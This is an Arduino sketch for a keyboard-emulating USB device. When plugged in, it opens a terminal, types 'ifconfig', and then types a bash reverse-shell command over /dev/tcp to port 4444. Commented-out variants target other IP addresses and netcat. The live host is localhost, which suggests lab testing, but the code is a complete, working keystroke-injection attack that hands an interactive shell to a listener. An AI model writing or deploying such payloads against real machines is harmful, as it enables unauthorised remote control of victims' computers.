
#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

// Wait 500ms
delay(5000);

//delay(3000);

    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press('t');
    Keyboard.releaseAll();

    delay(5000);

 //   delay(4000);

 //  Keyboard.print(F("gnome-terminal"));
  

  //typeKey(KEY_RETURN);
  //delay(750);ifconfig
  
  Keyboard.print("ifconfig");

  typeKey(KEY_RETURN);

  delay(750);

  delay(500);
 // Keyboard.print(F("nc 10.0.2.15 4444"));
  //Keyboard.print(F("nc localhost 4444"));
  //Keyboard.print("bash -i >& /dev/tcp/10.0.0.4/4444 0");
  Keyboard.print("bash -i >& /dev/tcp/127.0.0.1/4444 0");
 // Keyboard.print(F(" "));
   delay(100);
   Keyboard.print(F(">"));
   //Keyboard.print(F(""));
    Keyboard.print(F("&"));
    delay(100);
    Keyboard.print(F("1"));
  //Keyboard.print(F("1"));
  //Keyboard.print("-e /bin/bash");

 typeKey(KEY_RETURN);

delay(750);


  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
